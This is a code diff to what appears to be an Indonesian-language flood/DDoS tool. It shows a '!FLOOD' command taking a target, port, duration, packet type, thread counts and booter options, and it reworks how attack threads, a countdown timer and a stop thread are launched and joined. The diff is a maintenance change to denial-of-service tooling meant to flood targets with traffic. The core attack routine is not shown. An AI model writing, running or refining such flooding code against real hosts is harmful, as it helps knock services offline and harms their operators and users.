@@ -107,6 +107,8 @@ def countdown_timer(time_loader):
         sys.stdout.flush()
         time.sleep(1)
         remaining = int(time_loader - time.time())
+    if not stop_attack.is_set():
+        print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")
 
 def stop_attack_thread():
     input()
@@ -164,18 +166,18 @@ def command():
                         stop_attack.clear()  # Reset stop flag
                         print(f"{Fore.LIGHTCYAN_EX}Serangan diMulai\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}\n{Fore.RESET}")
                         # Start attack threads
-                        for _ in range(create_thread):
-                            for _ in range(spam_create_thread):
-                                th = threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet))
-                                th.start()
+                        attack_thread = threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet))
+                        attack_thread.start()
                         # Start countdown timer
-                        threading.Thread(target=countdown_timer, args=(time_loader,)).start()
+                        timer_thread = threading.Thread(target=countdown_timer, args=(time_loader,))
+                        timer_thread.start()
                         # Start stop attack thread
-                        threading.Thread(target=stop_attack_thread).start()
+                        stop_thread = threading.Thread(target=stop_attack_thread)
+                        stop_thread.start()
                         # Wait for attack to finish or be stopped
-                        while not stop_attack.is_set() and time.time() < time_loader:
-                            time.sleep(0.1)
-                        stop_attack.set()  # Ensure attack stops
+                        attack_thread.join()
+                        timer_thread.join()
+                        stop_thread.join()
                         continue  # Return to COMMAND prompt
                 else:
                     print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
